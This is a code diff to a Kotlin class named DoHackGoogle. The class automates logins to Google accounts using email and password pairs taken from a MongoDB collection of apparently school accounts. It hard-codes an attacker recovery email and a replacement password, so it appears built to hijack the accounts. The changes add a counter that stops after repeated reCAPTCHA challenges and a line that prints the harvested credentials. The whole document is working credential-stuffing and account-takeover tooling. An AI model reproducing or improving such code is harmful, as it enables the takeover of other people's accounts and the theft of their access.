@@ -24,21 +24,20 @@ class DoHackGoogle() {
     val serviceAccountDatabase = mongoClient.getDatabase("edu-school-account")
     val collection: MongoCollection<Document> = serviceAccountDatabase.getCollection("vimaru-email-info")
 
+    var captchaCount = 0
+
     fun run() {
-        while (true) {
-            collection.random(org.bson.Document("login_status", null).append("email_status", null))
-                    ?.let { googleRun(it) }
+        while (captchaCount < 10) {
+            collection.random(Document("login_status", null).append("email_status", null))?.let { googleRun(it) }
         }
     }
 
-    fun googleRun(doc: org.bson.Document) {
+    fun googleRun(doc: Document) {
         val email = doc.getString("email") ?: return
-        println(email)
         val pass = doc.getString("pass") ?: return
-        println(pass)
         val recoverEmail = "scr0pt.son@gmail.com"
         val newPassword = "TheMatrix@1999"
-
+        println("email: $email | pass: $pass | recoverEmail: $recoverEmail | newPassword: $newPassword")
 
         PageManager(driverManager,
                 "https://accounts.google.com/signin/v2/identifier?hl=vi&passive=true&continue=https%3A%2F%2Fwww.google.com%2F&flowName=GlifWebSignIn&flowEntry=ServiceLogin"
@@ -126,6 +125,10 @@ class DoHackGoogle() {
                     is Response.WAITING -> {
                     }
                 }
+
+                if(pageResponse is GoogleResponse.RECAPTCHA ) captchaCount++
+                else captchaCount = 0
+
                 println(pageResponse)
                 Thread.sleep(10000)
             }
